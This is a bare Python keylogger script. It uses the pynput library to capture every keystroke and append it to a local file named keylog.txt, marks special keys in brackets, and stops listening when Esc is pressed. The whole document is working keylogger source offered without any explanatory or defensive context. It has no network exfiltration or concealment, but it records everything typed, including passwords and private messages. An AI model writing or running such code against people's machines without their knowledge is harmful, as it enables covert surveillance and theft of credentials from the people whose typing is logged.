from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"\n{key.char}")
    except AttributeError:
        if key == keyboard.Key.space:
            with open(log_file, "a") as f:
                f.write(" ")
        elif key == keyboard.Key.enter:
            with open(log_file, "a") as f:
                f.write("\n")
        else:
            with open(log_file, "a") as f:
                f.write(f"\n[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False
    
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()